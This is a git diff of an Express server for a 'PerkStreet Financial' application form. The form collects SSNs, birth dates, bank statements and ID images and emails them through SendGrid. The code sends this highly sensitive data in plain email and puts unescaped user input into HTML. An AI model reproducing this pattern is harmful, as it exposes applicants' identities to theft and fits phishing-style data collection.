@@ -1,103 +1,90 @@
-<<<<<<< HEAD
-=======
+const express = require("express");
+const multer = require("multer");
+const cors = require("cors");
+const path = require("path");
+const dotenv = require("dotenv");
+const sgMail = require("@sendgrid/mail");
 
->>>>>>> 0f06ddf (Update: revised server.js and index.html for 6 statement fields and improved layout)
-require('dotenv').config();
-const express = require('express');
-const multer = require('multer');
-const nodemailer = require('nodemailer');
-const fs = require('fs');
-const path = require('path');
-const cors = require('cors');
+dotenv.config();
+sgMail.setApiKey(process.env.SENDGRID_API_KEY);
 
 const app = express();
-const port = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3000;
 
-// Middleware
 app.use(cors());
-app.use(express.static('frontend'));
-app.use(express.urlencoded({ extended: true }));
-app.use(express.json());
+app.use(express.static(path.join(__dirname, "../frontend")));
 
-// Set up storage for multer
 const storage = multer.memoryStorage();
-const upload = multer({ storage: storage }).fields([
-  { name: 'statement_jan' },
-  { name: 'statement_feb' },
-  { name: 'statement_mar' },
-  { name: 'statement_apr' },
-  { name: 'statement_may' },
-  { name: 'statement_jun' },
-  { name: 'front_id' },
-  { name: 'back_id' }
-]);
+const upload = multer({ storage });
 
-// Route to handle form submission
-app.post('/submit', upload, async (req, res) => {
+const uploadFields = [
+  { name: "bank_statement_1" },
+  { name: "bank_statement_2" },
+  { name: "bank_statement_3" },
+  { name: "bank_statement_4" },
+  { name: "bank_statement_5" },
+  { name: "bank_statement_6" },
+  { name: "id_front" },
+  { name: "id_back" },
+];
+
+app.post("/submit", upload.fields(uploadFields), async (req, res) => {
   try {
     const {
-      ssn, dob, phone, email, businessName,
-      businessAddress, homeAddress, ein, businessPhone,
-      businessWebsite, businessEmail, annualRevenue, position
+      ssn,
+      dob,
+      phone,
+      email,
+      business_name,
+      business_address,
+      home_address,
+      ein_tax_id,
+      business_phone,
+      business_website,
+      business_email,
+      annual_revenue,
+      position,
     } = req.body;
 
-    const transporter = nodemailer.createTransport({
-      service: 'gmail',
-      auth: {
-        user: process.env.SENDER_EMAIL,
-        pass: process.env.SENDER_PASSWORD
-      }
-    });
+    const attachments = Object.values(req.files || {}).flat().map((file) => ({
+      content: file.buffer.toString("base64"),
+      filename: file.originalname,
+      type: file.mimetype,
+      disposition: "attachment",
+    }));
 
-    const attachments = [];
-    const files = req.files || {};
-    for (const key in files) {
-      files[key].forEach(file => {
-        attachments.push({
-          filename: file.originalname,
-          content: file.buffer
-        });
-      });
-    }
-
-    const mailOptions = {
-      from: process.env.SENDER_EMAIL,
+    const msg = {
       to: process.env.RECEIVER_EMAIL,
-      subject: 'New Application Submission - PerkStreet',
-      text: `
-New Application Received:
-
-SSN: ${ssn}
-DOB: ${dob}
-Phone: ${phone}
-Email: ${email}
-Business Name: ${businessName}
-Business Address: ${businessAddress}
-Home Address: ${homeAddress}
-EIN/Tax ID: ${ein}
-Business Phone: ${businessPhone}
-Business Website: ${businessWebsite}
-Business Email: ${businessEmail}
-Annual Revenue: ${annualRevenue}
-Position: ${position}
+      from: process.env.RECEIVER_EMAIL,
+      subject: "New PerkStreet Financial Application",
+      text: "New submission received.",
+      html: `
+        <h2>PerkStreet Financial Application</h2>
+        <p><strong>SSN:</strong> ${ssn}</p>
+        <p><strong>DOB:</strong> ${dob}</p>
+        <p><strong>Phone:</strong> ${phone}</p>
+        <p><strong>Email:</strong> ${email}</p>
+        <p><strong>Business Name:</strong> ${business_name}</p>
+        <p><strong>Business Address:</strong> ${business_address}</p>
+        <p><strong>Home Address:</strong> ${home_address}</p>
+        <p><strong>EIN / Tax ID:</strong> ${ein_tax_id}</p>
+        <p><strong>Business Phone:</strong> ${business_phone}</p>
+        <p><strong>Business Website:</strong> ${business_website}</p>
+        <p><strong>Business Email:</strong> ${business_email}</p>
+        <p><strong>Annual Revenue:</strong> ${annual_revenue}</p>
+        <p><strong>Position:</strong> ${position}</p>
       `,
-      attachments: attachments
+      attachments,
     };
 
-    await transporter.sendMail(mailOptions);
-<<<<<<< HEAD
-    res.send('<h3 style="font-family:sans-serif;color:green;">â You're all set! We've received the application. Our team will review the information and get back to you within two business days. Keep an eye on your inbox.</h3>');
+    await sgMail.send(msg);
+    res.send("You're all set! We've received the application. Our team will review the information and get back to you within two business days. Keep an eye on your inbox.");
   } catch (error) {
-    console.error('â Error submitting form:', error);
-=======
-    res.send('<h3 style="font-family:sans-serif;color:green;">✅ You're all set! We've received the application. Our team will review the information and get back to you within two business days. Keep an eye on your inbox.</h3>');
-  } catch (error) {
-    console.error('❌ Error submitting form:', error);
->>>>>>> 0f06ddf (Update: revised server.js and index.html for 6 statement fields and improved layout)
-    res.status(500).send('<h3 style="font-family:sans-serif;color:red;">There was a problem processing your application. Please try again later or contact support.</h3>');
+    console.error("Email sending failed:", error);
+    res.status(500).send("An error occurred while processing your submission.");
   }
 });
 
-app.listen(port, () => {
-  console.log(`Server running at http://localhost:${port}`);
+app.listen(PORT, () => {
+  console.log(`Server is running on port ${PORT}`);
 });
